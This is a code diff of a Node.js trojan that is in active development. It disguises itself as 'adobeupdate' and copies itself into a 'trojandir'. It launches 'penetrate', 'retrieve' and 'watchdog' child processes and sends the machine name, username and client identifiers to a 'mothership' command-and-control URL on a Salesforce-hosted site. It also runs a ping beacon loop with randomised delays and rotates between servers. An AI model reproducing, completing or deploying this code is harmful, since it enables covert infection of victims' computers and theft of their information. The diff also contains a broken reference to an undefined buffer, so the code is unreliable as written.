@@ -1,3 +1,4 @@
+// 20260701-2026
 // https://onecompiler.com/nodejs#draft-yf7t
 const { execFile } = require('child_process');
 const net = require('net');
@@ -20,7 +21,7 @@ const ISDEBUG = true;
 // Get-WmiObject Win32_Process | Select-Object ProcessID, Name, CommandLine | Format-List
 // wmic process get ProcessId,Name,CommandLine /format:csv
 // nircmdc
-// ! tasklist is very slow
+// ! tasklist is very slow, powershell is also slow
 
 // ! creating/deleting/query tasks and registry not natively supported by node, have to implement
 // bat/cmd, ps1, vbs failover
@@ -71,6 +72,18 @@ var systemstate = {
             return 'init';
     },
 
+    childcmds: [],
+
+    __cmdconfig: null,
+
+    get cmdconfig() {
+        if ( this.__cmdconfig )
+            return this.__cmdconfig;
+
+        this.__cmdconfig = new CmdConfig(this.cmdname);
+        return this.__cmdconfig;
+    },
+
     get cmdtaskname() {
         if ( ( this.cmdname == 'task' ) && ( process.argv.length >= 4 ) ) {
             return process.argv[3];
@@ -87,7 +100,7 @@ var systemstate = {
     get mothership() { 
         
         if ( this.mothershipindex < 0 )
-            selectMothership();
+            return this.selectMothership();
 
         return (this.istpl ? this.tplmothershiplist : this.phpmothershiplist )[this.mothershipindex];
     },
@@ -101,20 +114,22 @@ var systemstate = {
     ],
     tplmothershiplist: [ "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault" ],
     selectMothership: function() {
-        let mothershiparr = systemstate.istpl ? systemstate.tplmothershiplist : systemstate.phpmothershiplist;
+        let mothershiparr = this.istpl ? this.tplmothershiplist : this.phpmothershiplist;
     
         let count = mothershiparr.length;
     
-        if ( ( systemstate.mothershipindex < -1 ) || ( systemstate.mothershipindex == count -1 ) ) {
-            systemstate.mothershipindex = 0;
+        if ( ( this.mothershipindex < -1 ) || ( this.mothershipindex == count -1 ) ) {
+            this.mothershipindex = 0;
         } else {
-            systemstate.mothershipindex++;
+            this.mothershipindex++;
         }
     
-        writeTag(path.join(systemstate.trojandir, 'mothership'));
+        writeTag(path.join(this.trojandir, 'mothership'), mothershiparr[this.mothershipindex] );
     
-        return;    
+        logmsg(`index:  ${this.mothershipindex} mothership: ${mothershiparr[this.mothershipindex]}`);
+        return mothershiparr[this.mothershipindex];    
     },
+
 
     __clientid: '',
 
@@ -182,8 +197,12 @@ var systemstate = {
         return path.basename(this.scriptfpath);
     },
 
+    __jobcode: '',
+
     get jobcode() {
-        // jobcode=####xxyy
+
+        if ( ! isNullOrWhitespace(this.__jobcode) )
+            return this.__jobcode;
 
         let codeout = '';
 
@@ -197,7 +216,16 @@ var systemstate = {
             }
         }
 
+        this.__jobcode = codeout;
+
         return codeout;
+    },
+
+    get batchid() {
+        if ( ! isNullOrWhitespace(this.jobcode) )
+            return this.jobcode;
+
+        return this.sessionid;
     },
 
     scriptts: getTimestamp(),
@@ -210,7 +238,14 @@ var systemstate = {
         return this.__scriptmd5;
     },
 
-    sessionid: getRandomCode(8),
+    __sessionid: getRandomCode(8),
+
+    get sessionid() {
+        if ( ! isNullOrWhitespace(this.jobcode) )
+            return this.jobcode;
+
+        return this.__sessionid;
+    },
 
     get logfpath() {
         if ( ! isNullOrWhitespace(this.cmdtaskname) )
@@ -229,7 +264,16 @@ var systemstate = {
 
     get statekvp() {
         return {
-
+            clientid: this.clientid,
+            sessionid: this.sessionid,
+            batchid: this.batchid,
+            jobcode: this.jobcode,
+            script_version: this.script_version,
+            source: this.source,
+            scriptts: this.scriptts,
+            machinename: this.machinename,
+            username: this.username,
+            scriptmd5: this.scriptmd5
         };
     },
 
@@ -244,15 +288,19 @@ class CmdConfig {
     #launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
     #childprocess = null;
     
+    loopfunc = async () => { logmsg('looping'); };
+
     // TODO: runonce --> should be executed by cmdlist
 
+    parentcmdconfig = null;
+
     constructor(tcmdname) {
-        if ( CmdConfig.isCmdExist(tcmdname) )
+        if ( CmdConfig.isCmdExist(tcmdname)  )
             this.cmdname = tcmdname;
         else
-            throw new Error('cmd not supported ['+tcmdname+']');
-
+            throw new Error('cmd is not supported ['+tcmdname+']');
     };
+
 
     static cmdfuncs = {
         penetrate: penetrate,
@@ -263,7 +311,13 @@ class CmdConfig {
         noderelay: null,
         pythonrelay: null,
         pcmon: null,
-        pspcmon: null
+        pspcmon: null,
+        init: startup,
+        task: startup
+    };
+
+    get dynamicdelay() {
+        return crypto.randomInt(1, 10) * 5;
     };
 
     get cmdfunc() {
@@ -324,11 +378,11 @@ class CmdConfig {
 
         let tchildproc = getProcess(child.pid);
 
-        logmsg("launched child with pid=" + String(child.pid) + ' spawn args: ' + JSON.stringify(child.spawnargs));
+        logmsg(`launched child ${this.cmdname} pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs));
         // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
 
         writeTag(this.cmdpidfpath, String(child.pid));
-
+        
         child.on('message', (message) => {
             logmsg('[PARENT] received from child: ' + JSON.stringify(message));
         });
@@ -349,6 +403,49 @@ class CmdConfig {
         // killall --> exit without deleting
         // reset_ & tcmdname & loop --> delete then exit
     };
+
+    async loop() { 
+
+        logmsg("starting main looop");
+        
+        if ( ! this.loopfunc ) {
+            logmsg('Fatal Error: loopfunc is not a valid function');
+            process.exit(1);
+        }
+    
+        let loopindex = 0;
+        while (true) {
+            loopindex++;
+            logmsg(`loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`);
+            
+            this.exitramp();
+    
+            try {
+                if ( isAsyncFunction(this.loopfunc) )
+                    await this.loopfunc();
+                else
+                    this.loopfunc();
+            } catch (err) {
+                logmsg(err);
+            }
+    
+            logmsg("sleeping for ["+systemstate.staticdelay+"] seconds");
+    
+            for ( let i =0; i< (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
+                logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
+                await sleep(1000); 
+            }
+    
+            let num = this.dynamicdelay;
+    
+            logmsg(`sleeping for an additional ${num} seconds`);
+    
+            for ( let i =0; i<(ISDEBUG ? 0 : num); i++) {
+                logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
+                await sleep(1000); 
+            }
+        }
+    }
     
 };
 
@@ -510,7 +607,7 @@ function getCallerName() {
 function logmsg(msgstr) {
     
     let callername = getCallerName();
-    let msgout = callername + '|' + String(systemstate.scriptpid) + '|' + String(systemstate.cmdname);
+    let msgout = '|' + String(systemstate.cmdname) + '|' + String(systemstate.scriptpid) +  '|' + callername ;
 
     if ( msgstr instanceof Error ) {
         msgout += '|' + util.inspect(msgstr);
@@ -652,11 +749,16 @@ async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null
     if ( downloadOpts.filetype == 'txt' ) {
         let rawText = await response.text(); 
         fs.writeFileSync(downloadOpts.localpath, rawText, 'utf8');
+        responseOut.rawText = rawText;
     } else {
         const arrayBuffer = await response.arrayBuffer();
-        const buffer = Buffer.from(arrayBuffer);
-        await fs.writeFile(downloadOpts.localpath, buffer);
+        // const buffer = Buffer.from(arrayBuffer);
+        const bufferView = new Uint8Array(arrayBuffer);
+        fs.writeFileSync(downloadOpts.localpath, bufferView);
+        responseOut.buffer = buffer;
     }
+
+    responseOut.downloadOpts = downloadOpts;
 
     logmsg("finished");
 
@@ -731,53 +833,8 @@ const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 function isAsyncFunction(fn) {
     return fn?.constructor?.name === 'AsyncFunction';
-  }
-  
-async function loop(cmdobj) { 
-
-    logmsg("starting main looop");
-
-    let cmdfunc = cmdobj.cmdfunc;
-
-    if ( ! cmdfunc ) {
-        logmsg('Fatal Error: cmdfunc is not a valid function');
-        process.exit(1);
-    }
-
-    let loopindex = 0;
-    while (true) {
-        loopindex++;
-        logmsg(`loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`);
-        
-        cmdobj.exitramp();
-
-        try {
-            if ( isAsyncFunction(cmdfunc) )
-                await cmdfunc();
-            else
-                cmdfunc();
-        } catch (err) {
-            logmsg(err);
-        }
-
-        logmsg("sleeping for ["+systemstate.staticdelay+"] seconds");
-
-        for ( let i =0; i< (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
-            logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
-            await sleep(1000); 
-        }
-
-        let num = crypto.randomInt(1, 10) * 5;
-
-        logmsg(`sleeping for an additional ${num} seconds`);
-
-        for ( let i =0; i<(ISDEBUG ? 0 : num); i++) {
-            logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
-            await sleep(1000); 
-        }
-    }
 }
-
+  
 // --- startup
 
 logmsg("starting -- cmdname=" + systemstate.cmdname + ' ts='+systemstate.scriptts);
@@ -785,7 +842,7 @@ logmsg('scriptmd5='+systemstate.scriptmd5);
 
 getProcessList();
 
-ensureSingleInstancePipe(startup);
+ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 
 // --- IPC
 
@@ -817,45 +874,23 @@ if (hasParent) {
 function startup() {    
     logmsg('starting');
 
-    init();
-
-    if ( systemstate.cmdname == "init" || systemstate.cmdname == "task" ) {
-        let penetrate = new CmdConfig('penetrate');
-        let retrieve = new CmdConfig('retrieve');
-        let watchdog = new CmdConfig('watchdog');
-    
-        penetrate.launch();
-        retrieve.launch();
-        watchdog.activate();
-    
-        logmsg('finished -- exiting');
-
-        // process.exit(0); 
-    } else {
-        let maincmd = new CmdConfig(systemstate.cmdname);
-
-        maincmd.cmdfunc();
-    }
-
-    logmsg('finished');
-}
-// ---
-
-
-function init() {
-    logmsg('starting');
-
     setcwd(systemstate.trojandir);
     
     copyFile(systemstate.scriptfpath, systemstate.trojanfpath);
 
-    logmsg('systemstate: '+systemstate.statestr);
+    logmsg(`systemstate: [${systemstate.statestr}]`);
     logMsgMothership(systemstate.statekvp);
+
+    let penetrate = new CmdConfig('penetrate');
+    let retrieve = new CmdConfig('retrieve');
+    let watchdog = new CmdConfig('watchdog');
+
+    penetrate.launch();
+    retrieve.launch();
+    watchdog.activate();
 
     logmsg('finished');
 }
-
-var childcmds = [];
 
 function watchdog() {
     logmsg('starting');
@@ -863,15 +898,21 @@ function watchdog() {
     let ping = new CmdConfig('ping');
     let cmdlist = new CmdConfig('cmdlist');
     
-    childcmds.push(ping, cmdlist);
+    let childcmds = systemstate.childcmds;
 
-    loop(() => {
+    childcmds.push(ping, cmdlist);
+    
+    let cmdconfig = systemstate.cmdconfig;
+
+    cmdconfig.loopfunc = () => {
         for ( let i = 0; i<childcmds.length; i++) {
             let childcmd = childcmds[i];
     
             childcmd.activate();
         }    
-    });
+    };
+
+    cmdconfig.loop();
 
     logmsg('finished');
 }
@@ -879,8 +920,10 @@ function watchdog() {
 function ping() {
     logmsg('starting');
 
-    loop(async () => {
-        baseUrl = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ow/ping.php';
+    let cmdconfig = systemstate.cmdconfig;
+
+    cmdconfig.loopfunc = async () => {
+        baseUrl = systemstate.mothership + '/ow/ping.php';
 
         let inputHeaders = null;
         let params = {
@@ -889,8 +932,12 @@ function ping() {
         downloadOpts = null;
         
         let pingreq = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
+        
+        let rawtext = pingreq.rawText;
+        logmsg(rawtext);
+    };
 
-    });
+    cmdconfig.loop();
 
     logmsg('finished');
 }
@@ -898,9 +945,13 @@ function ping() {
 function cmdlist() {
     logmsg('starting');
 
-    loop(() => {
+    let cmdconfig = systemstate.cmdconfig;
+
+    cmdconfig.loopfunc = () => {
         logmsg("cmdlist doing some work...");
-    });
+    };
+
+    cmdconfig.loop();
 
     logmsg('finished');
 }
